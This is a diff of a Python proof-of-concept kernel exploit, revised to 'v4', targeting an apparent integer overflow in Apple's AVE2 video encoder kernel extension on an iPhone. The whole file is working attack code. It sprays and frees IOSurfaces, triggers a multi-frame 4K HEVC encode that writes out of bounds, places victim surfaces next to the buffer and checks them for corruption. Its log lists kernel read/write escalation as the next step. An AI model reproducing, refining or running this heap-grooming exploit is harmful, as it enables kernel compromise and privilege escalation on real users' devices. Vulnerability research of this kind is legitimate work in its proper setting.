@@ -1,21 +1,30 @@
 """
-AVE2 DPB overflow heap groom PoC
+AVE2 DPB overflow heap groom PoC  —  v4 (corrected)
 Target: iOS 26.6.1 (iPhone17,4) — AppleAVE2 kext
 
 Root cause: DPB buffer size = DPB_unit * NTL computed in 32-bit.
   DPB_unit = 60 * 34 * 1024 = 2,088,960 bytes  (4K HEVC, 64px CTU)
   NTL=2057: 2,088,960 * 2057 = 4,296,990,720 → wraps to 2,023,424 bytes
-  Firmware allocates ~2 MB but writes as if buffer is ~4.3 GB → OOB write.
+  Firmware allocates ~1.93 MB but writes as if buffer is ~4.3 GB → OOB write.
 
-Groom strategy:
-  1. Spray 64 IOSurfaces at exactly 2,023,424 bytes (same kmem_alloc_contig path)
-  2. Free every other one → 32 holes in physically-contiguous range
-  3. Allocate 32 victim surfaces → land in holes
-  4. Record baselines: (alloc_size, surf_id) per victim
-  5. Trigger NTL=2057 encode → DPB lands in a hole, OOB write hits adjacent victim header
-  6. Scan victims: any alloc_size or ID change = confirmed kernel write
+Key corrections vs v1:
+  1. IOSurfaceRelease absent on iOS 26.6.1 → use CF.CFRelease (CFTypeRef compat)
+  2. Single frame only writes DPB[0] at offset 0 (in-bounds, no OOB).
+     Need 2+ frames: frame 1 writes DPB[1] at offset 2,088,960 > 2,023,424 → OOB.
+  3. Feeder pattern: FREE ALL spray, trigger encode (DPB claims freed pages, 20ms),
+     THEN allocate victims. Old pattern (spray→free half→victims→trigger) filled
+     all holes before triggering so DPB went to new memory.
+  4. VTCompressionSessionInvalidate hangs indefinitely after multi-frame NTL=2057
+     encode (firmware waiting for GOP). Do NOT call it.
+  5. Actual IOSurface allocation = 2,031,616 bytes (16KB aligned, not 2,023,424).
+     Victim starts 8,192 bytes after DPB's physical end. DPB still writes into
+     the victim's first 8192-byte gap at frame 1 offset; victim header should be hit.
 
-Run conditions: fresh reboot, memory < 1400 MB baseline.
+Feeder pattern timing:
+  Free all spray  →  queue 5 frames  →  sleep 20ms (DPB claims freed pages)
+  →  allocate victims (land immediately after DPB in physical address space)
+
+Run conditions: fresh reboot, memory < 1400 MB baseline, all background apps closed.
 AppGroup UUID: 92767569-346F-4ECE-B7F6-8107C7A21B5B
 """
 
@@ -25,12 +34,15 @@ APPGROUP = (
     "/private/var/mobile/Containers/Shared/AppGroup"
     "/92767569-346F-4ECE-B7F6-8107C7A21B5B/Library"
 )
-LOG_FILE = f"{APPGROUP}/ave2_groom_poc.txt"
+LOG_FILE = f"{APPGROUP}/ave2_groom_v4.txt"
 
 GROOM_SIZE    = 2_023_424   # (DPB_unit * 2057) & 0xFFFFFFFF — exact wrapped DPB alloc
-SPRAY_COUNT   = 64          # surfaces to spray; free even indices → 32 holes
+SPRAY_COUNT   = 16          # all freed before encode (feeder pattern), 32 MB total
+VICTIM_COUNT  = 16          # placed after DPB claims freed pages
+NUM_FRAMES    = 5           # frame 0 is in-bounds; frames 1-4 trigger DPB[1-4] OOB writes
+DPB_WAIT_S    = 0.020       # 20ms: let DPB claim freed pages before victims land
+OOB_WAIT_S    = 12.0        # 12s poll window for OOB write to complete
 NTL_TRIGGER   = 2057        # first true 32-bit overflow
-OOB_WAIT_S    = 3.0         # seconds to let firmware do the OOB write
 
 WIDTH, HEIGHT = 3840, 2160  # 4K HEVC
 kHEVC         = 0x68766331  # 'hvc1'
@@ -73,14 +85,13 @@ CF.CFDictionaryCreate.argtypes = [
 ]
 CF.CFRelease.argtypes = [C.c_void_p]
 
-# IOSurface
-IS.IOSurfaceCreate.restype       = C.c_void_p
-IS.IOSurfaceCreate.argtypes      = [C.c_void_p]
-IS.IOSurfaceRelease.argtypes     = [C.c_void_p]
+# IOSurface  (IOSurfaceRelease absent on iOS 26.6.1 — use CFRelease instead)
+IS.IOSurfaceCreate.restype        = C.c_void_p
+IS.IOSurfaceCreate.argtypes       = [C.c_void_p]
 IS.IOSurfaceGetAllocSize.restype  = C.c_size_t
 IS.IOSurfaceGetAllocSize.argtypes = [C.c_void_p]
-IS.IOSurfaceGetID.restype        = C.c_uint32
-IS.IOSurfaceGetID.argtypes       = [C.c_void_p]
+IS.IOSurfaceGetID.restype         = C.c_uint32
+IS.IOSurfaceGetID.argtypes        = [C.c_void_p]
 
 # CoreVideo
 CV.CVPixelBufferCreate.restype  = C.c_int32
@@ -99,7 +110,8 @@ VT.VTCompressionSessionCreate.argtypes = [
 ]
 VT.VTSessionSetProperty.restype  = C.c_int32
 VT.VTSessionSetProperty.argtypes = [C.c_void_p, C.c_void_p, C.c_void_p]
-VT.VTCompressionSessionInvalidate.argtypes = [C.c_void_p]
+# NOTE: VTCompressionSessionInvalidate intentionally NOT called in this PoC.
+# It hangs indefinitely after multi-frame NTL=2057 encode (firmware waiting for GOP).
 
 class CMTime(C.Structure):
     _fields_ = [
@@ -119,11 +131,9 @@ def _output_cb(*a): pass
 
 # ------------------------------------------------ CF dict helpers for IOSurface --
 
-# Lock down callback structs via array trick so addressof() gives the right pointer
 _kDictKeyCB = (C.c_uint8 * 64).in_dll(CF, "kCFTypeDictionaryKeyCallBacks")
 _kDictValCB = (C.c_uint8 * 64).in_dll(CF, "kCFTypeDictionaryValueCallBacks")
 
-# Build the "IOSurfaceAllocSize" key string once
 _key_alloc_str = CF.CFStringCreateWithCString(None, b"IOSurfaceAllocSize", kCFStringEncodingUTF8)
 
 def _make_surf_props(size):
@@ -145,17 +155,19 @@ def create_surf(size=GROOM_SIZE):
     CF.CFRelease(props)
     return surf or None
 
-def release_surf(surf):
-    if surf:
-        IS.IOSurfaceRelease(surf)
+def release_surf(s):
+    if s:
+        CF.CFRelease(s)   # IOSurfaceRelease absent on iOS 26.6.1; IOSurfaceRef is CFType-compatible
 
-# ------------------------------------------------------------------ trigger --
+# ----------------------------------------------- multi-frame VT encode trigger --
 
-def trigger_ntl_encode(ntl):
+def trigger_encode_multiframe(ntl, num_frames):
     """
-    Create a VT session with the given NTL and queue one frame.
-    Returns (session_ptr, status_msg). Does NOT invalidate — caller must.
-    Session stays alive so the firmware OOB write can complete.
+    Create a VT session with the given NTL and queue num_frames frames.
+    Frame 0 writes DPB[0] at offset 0 (in-bounds).
+    Frame 1+ write DPB[1+] at offset n*DPB_UNIT > GROOM_SIZE → OOB write.
+    Returns (session_ptr, status_msg).
+    IMPORTANT: does NOT call VTCompressionSessionInvalidate — it hangs.
     """
     sess = C.c_void_p(0)
     st = VT.VTCompressionSessionCreate(
@@ -170,44 +182,45 @@ def trigger_ntl_encode(ntl):
     st2 = VT.VTSessionSetProperty(sess.value, ntl_key, ntl_val)
     CF.CFRelease(ntl_val)
     if st2 != 0:
-        VT.VTCompressionSessionInvalidate(sess.value)
         return None, f"ntl_rejected({st2:#x})"
 
-    pbuf = C.c_void_p(0)
-    st3 = CV.CVPixelBufferCreate(None, WIDTH, HEIGHT, kCV420v, None, C.byref(pbuf))
-    if st3 != 0 or not pbuf.value:
-        VT.VTCompressionSessionInvalidate(sess.value)
-        return None, f"pixbuf_fail({st3:#x})"
+    for fi in range(num_frames):
+        pbuf = C.c_void_p(0)
+        st3 = CV.CVPixelBufferCreate(None, WIDTH, HEIGHT, kCV420v, None, C.byref(pbuf))
+        if st3 != 0 or not pbuf.value:
+            return sess.value, f"pixbuf_fail_at_frame_{fi}({st3:#x})"
+        pts  = CMTime(value=fi * 3000, timescale=90000, flags=1, epoch=0)
+        dur  = CMTime(value=3000,      timescale=90000, flags=1, epoch=0)
+        info = C.c_uint32(0)
+        st4  = VT.VTCompressionSessionEncodeFrame(
+            sess.value, pbuf.value, pts, dur, None, None, C.byref(info)
+        )
+        CV.CVPixelBufferRelease(pbuf.value)
+        log(f"  frame {fi}: encode_st={st4:#x}")
 
-    pts  = CMTime(value=0,    timescale=90000, flags=1, epoch=0)
-    dur  = CMTime(value=3000, timescale=90000, flags=1, epoch=0)
-    info = C.c_uint32(0)
-    st4  = VT.VTCompressionSessionEncodeFrame(
-        sess.value, pbuf.value, pts, dur, None, None, C.byref(info)
-    )
-    CV.CVPixelBufferRelease(pbuf.value)
-
-    return sess.value, f"encode_queued st={st4:#x}"
+    return sess.value, f"queued {num_frames} frames"
 
 # ================================================================ main groom ==
 
 log("=" * 60)
-log("AVE2 DPB groom PoC — spray/groom/trigger/scan")
+log("AVE2 DPB groom PoC v4 — feeder pattern + multi-frame OOB")
 log(f"GROOM_SIZE={GROOM_SIZE} ({GROOM_SIZE/1024/1024:.2f} MB)")
-log(f"DPB_UNIT={DPB_UNIT}  NTL_TRIGGER={NTL_TRIGGER}")
-log(f"overflow check: {DPB_UNIT}*{NTL_TRIGGER}&0xffffffff = {(DPB_UNIT*NTL_TRIGGER)&0xFFFFFFFF}")
+log(f"DPB_UNIT={DPB_UNIT}  NTL={NTL_TRIGGER}  FRAMES={NUM_FRAMES}")
+log(f"overflow: {DPB_UNIT}*{NTL_TRIGGER}&0xffffffff = {(DPB_UNIT*NTL_TRIGGER)&0xFFFFFFFF}")
+log(f"first OOB offset: DPB_UNIT={DPB_UNIT} > GROOM_SIZE={GROOM_SIZE} ✓")
+log(f"SPRAY={SPRAY_COUNT}  VICTIMS={VICTIM_COUNT}  DPB_WAIT={DPB_WAIT_S*1000:.0f}ms  OOB_WAIT={OOB_WAIT_S}s")
 
 rss = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
 rss_mb = rss / (1024 * 1024)
 log(f"Process RSS: {rss_mb:.0f} MB")
 if rss_mb > 1300:
-    log("WARNING: RSS > 1300 MB — high risk of OOM during spray. Reboot recommended.")
+    log("WARNING: RSS > 1300 MB — high risk of jetsam during spray")
 
 # ----------------------------------------------------------------- Phase 1: sanity
 log("--- Phase 1: sanity check ---")
 test = create_surf()
 if not test:
-    log("FATAL: IOSurfaceCreate returned NULL — IOSurface may be blocked from sandbox")
+    log("FATAL: IOSurfaceCreate returned NULL — IOSurface blocked from sandbox")
     sys.exit(1)
 test_sz = IS.IOSurfaceGetAllocSize(test)
 test_id = IS.IOSurfaceGetID(test)
@@ -216,121 +229,130 @@ if test_sz == 0:
     log("FATAL: GetAllocSize returned 0 — IOSurface header not accessible")
     release_surf(test)
     sys.exit(1)
-if test_sz != GROOM_SIZE:
-    log(f"WARNING: alloc_size mismatch (got {test_sz}, expected {GROOM_SIZE})")
-    log("Kernel may round up — adjust GROOM_SIZE to match and re-run")
+actual_alloc = test_sz  # kernel rounds up: expect 2,031,616 (not 2,023,424)
+if actual_alloc != GROOM_SIZE:
+    log(f"NOTE: kernel rounded alloc {GROOM_SIZE} → {actual_alloc} ({actual_alloc - GROOM_SIZE} byte gap)")
 release_surf(test)
 log("sanity OK")
 
 # ----------------------------------------------------------------- Phase 2: spray
-log(f"--- Phase 2: spray {SPRAY_COUNT} surfaces at {GROOM_SIZE} bytes ---")
+log(f"--- Phase 2: spray {SPRAY_COUNT} surfaces (will all be freed as feeder) ---")
 spray = []
 for i in range(SPRAY_COUNT):
     s = create_surf()
     spray.append(s)
     if not s:
-        log(f"WARNING: spray[{i}] = NULL (memory pressure?)")
+        log(f"WARNING: spray[{i}] = NULL (memory pressure)")
 n_spray = sum(1 for s in spray if s)
-log(f"sprayed {n_spray}/{SPRAY_COUNT} surfaces")
+log(f"sprayed {n_spray}/{SPRAY_COUNT} surfaces ({n_spray * actual_alloc / 1024 / 1024:.1f} MB)")
 
-# ----------------------------------------------------------------- Phase 3: holes
-log("--- Phase 3: free even-indexed surfaces → 32 holes ---")
-for i in range(0, SPRAY_COUNT, 2):
-    if spray[i]:
-        release_surf(spray[i])
-        spray[i] = None
-n_holes = sum(1 for s in spray if s is None)
-log(f"{n_holes} holes created")
+# ----------------------------------------------------------------- Phase 3: free ALL spray (feeder)
+log("--- Phase 3: free ALL spray (feeder — creates large contiguous free zone) ---")
+for i, s in enumerate(spray):
+    release_surf(s)
+spray = None
+log("all spray freed — free zone ready for DPB")
 
-# ----------------------------------------------------------------- Phase 4: victims
-victim_count = SPRAY_COUNT // 2  # 32
-log(f"--- Phase 4: allocate {victim_count} victim surfaces (land in holes) ---")
+# ----------------------------------------------------------------- Phase 4: encode (multi-frame, NTL=2057)
+log(f"--- Phase 4: trigger NTL={NTL_TRIGGER} encode ({NUM_FRAMES} frames) ---")
+t_encode = time.time()
+sess, msg = trigger_encode_multiframe(NTL_TRIGGER, NUM_FRAMES)
+t_encode_done = time.time()
+log(f"encode result: {msg}  sess={sess:#x if sess else 0}  ({t_encode_done - t_encode:.2f}s)")
+if not sess:
+    log("FATAL: encode failed — aborting")
+    sys.exit(1)
+
+# ----------------------------------------------------------------- Phase 5: wait for DPB to claim pages
+log(f"--- Phase 5: sleep {DPB_WAIT_S*1000:.0f}ms — let DPB allocate into freed pages ---")
+time.sleep(DPB_WAIT_S)
+
+# ----------------------------------------------------------------- Phase 6: victims (land right after DPB)
+log(f"--- Phase 6: allocate {VICTIM_COUNT} victims (land in pages adjacent to DPB) ---")
 victims = []
-for i in range(victim_count):
+for i in range(VICTIM_COUNT):
     v = create_surf()
     victims.append(v)
     if not v:
-        log(f"WARNING: victim[{i}] = NULL")
+        log(f"WARNING: victim[{i}] = NULL (memory pressure)")
 n_victims = sum(1 for v in victims if v)
-log(f"{n_victims}/{victim_count} victims allocated")
+log(f"{n_victims}/{VICTIM_COUNT} victims allocated")
 
-# ----------------------------------------------------------------- Phase 5: baselines
-log("--- Phase 5: record victim baselines ---")
-baseline = {}  # ptr → (alloc_size, surf_id)
+# ----------------------------------------------------------------- Phase 7: baselines
+log("--- Phase 7: record victim baselines ---")
+baseline = {}
 for i, v in enumerate(victims):
     if v:
         sz  = IS.IOSurfaceGetAllocSize(v)
         sid = IS.IOSurfaceGetID(v)
         baseline[v] = (sz, sid)
-        if sz != GROOM_SIZE:
-            log(f"WARNING: victim[{i}] baseline size={sz} != {GROOM_SIZE}")
 log(f"baselines recorded for {len(baseline)} victims")
 
-# ----------------------------------------------------------------- Phase 6: trigger
-log(f"--- Phase 6: trigger NTL={NTL_TRIGGER} encode ---")
+# ----------------------------------------------------------------- Phase 8: OOB wait with polling
+log(f"--- Phase 8: wait {OOB_WAIT_S}s for OOB write to complete (polling every 2s) ---")
 t0 = time.time()
-sess, msg = trigger_ntl_encode(NTL_TRIGGER)
-elapsed = time.time() - t0
-log(f"trigger result: {msg}  sess={sess:#x if sess else 0}  ({elapsed:.2f}s)")
-
-if not sess:
-    log("FATAL: could not start encode — stopping before scan")
-else:
-    log(f"encode queued — waiting {OOB_WAIT_S}s for firmware OOB write to land...")
-    time.sleep(OOB_WAIT_S)
-
-    # -------------------------------------------------------------- Phase 7: scan
-    log("--- Phase 7: scan victims for corruption ---")
-    corrupted_sz  = []
-    corrupted_id  = []
-
+found_early = False
+while time.time() - t0 < OOB_WAIT_S:
+    time.sleep(2.0)
+    elapsed = time.time() - t0
     for i, v in enumerate(victims):
-        if not v:
+        if not v or v not in baseline:
             continue
         sz  = IS.IOSurfaceGetAllocSize(v)
         sid = IS.IOSurfaceGetID(v)
-        bl_sz, bl_id = baseline.get(v, (GROOM_SIZE, 0))
+        bl_sz, bl_id = baseline[v]
+        if sz != bl_sz or sid != bl_id:
+            log(f"*** EARLY CORRUPTION at {elapsed:.1f}s: victim[{i:02d}] ptr={v:#x}  "
+                f"alloc_size {bl_sz}→{sz}  id {bl_id}→{sid}")
+            found_early = True
+    if found_early:
+        log("early corruption detected — breaking poll loop")
+        break
+    log(f"  poll at {elapsed:.1f}s — no corruption yet")
 
-        sz_changed = (sz != bl_sz)
-        id_changed = (sid != bl_id)
+# ----------------------------------------------------------------- Phase 9: final scan
+log("--- Phase 9: final scan ---")
+corrupted_sz = []
+corrupted_id = []
 
-        if sz_changed or id_changed:
-            tag = "ALLOC_SIZE" if sz_changed else "" + " SURF_ID" if id_changed else ""
-            log(
-                f"*** CORRUPTION victim[{i:02d}] ptr={v:#x}  "
-                f"alloc_size {bl_sz}→{sz}  id {bl_id}→{sid}  [{tag.strip()}]"
-            )
-            if sz_changed:
-                corrupted_sz.append(i)
-            if id_changed:
-                corrupted_id.append(i)
+for i, v in enumerate(victims):
+    if not v:
+        continue
+    sz  = IS.IOSurfaceGetAllocSize(v)
+    sid = IS.IOSurfaceGetID(v)
+    bl_sz, bl_id = baseline.get(v, (actual_alloc, 0))
 
-    if corrupted_sz or corrupted_id:
-        log("=" * 60)
-        log(f"KERNEL WRITE CONFIRMED")
-        log(f"  alloc_size corrupted: {len(corrupted_sz)} victim(s) {corrupted_sz}")
-        log(f"  surf_id    corrupted: {len(corrupted_id)} victim(s) {corrupted_id}")
-        log("Next step: replace victim with pipe buffer → escalate to kernel R/W")
-        log("=" * 60)
-    else:
-        log("No corruption detected this run.")
-        log("Possible reasons:")
-        log("  - Groom miss: DPB landed outside victim range (try more spray)")
-        log("  - OOB write too fast: landed before victims placed (reduce spray count)")
-        log("  - alloc_size rounded differently: check test surf alloc_size above")
-        log("  - Firmware didn't write yet: increase OOB_WAIT_S")
+    if sz != bl_sz or sid != bl_id:
+        log(
+            f"*** CORRUPTION victim[{i:02d}] ptr={v:#x}  "
+            f"alloc_size {bl_sz}→{sz}  id {bl_id}→{sid}"
+        )
+        if sz != bl_sz:
+            corrupted_sz.append(i)
+        if sid != bl_id:
+            corrupted_id.append(i)
 
-    # -------------------------------------------------------------- Phase 8: cleanup
-    log("--- Phase 8: cleanup ---")
-    VT.VTCompressionSessionInvalidate(sess)
-    log("VT session invalidated")
+if corrupted_sz or corrupted_id:
+    log("=" * 60)
+    log("KERNEL WRITE CONFIRMED")
+    log(f"  alloc_size corrupted: {len(corrupted_sz)} victim(s) {corrupted_sz}")
+    log(f"  surf_id    corrupted: {len(corrupted_id)} victim(s) {corrupted_id}")
+    log("Next step: replace victim with pipe buffer → escalate to kernel R/W")
+    log("=" * 60)
+else:
+    log("No corruption detected.")
+    log("Possible reasons:")
+    log("  - Groom miss: DPB landed outside victim range (try more spray)")
+    log("  - 8192-byte gap between DPB end and victim: OOB may not reach victim header")
+    log("  - alloc_size rounded differently: check test surf actual_alloc above")
+    log("  - Firmware didn't write frame 1 yet: increase OOB_WAIT_S")
+    log("  - Memory pressure: not enough victims landed adjacent to DPB")
 
+# ----------------------------------------------------------------- Phase 10: cleanup
+log("--- Phase 10: cleanup (surfaces only — NO VTInvalidate, it hangs) ---")
 for v in victims:
-    if v:
-        release_surf(v)
-for s in spray:
-    if s:
-        release_surf(s)
-log("all surfaces released")
+    release_surf(v)
+log("victims released")
+log("NOTE: VT session left active (Invalidate hangs; firmware running in background)")
 
 log("=== DONE ===")
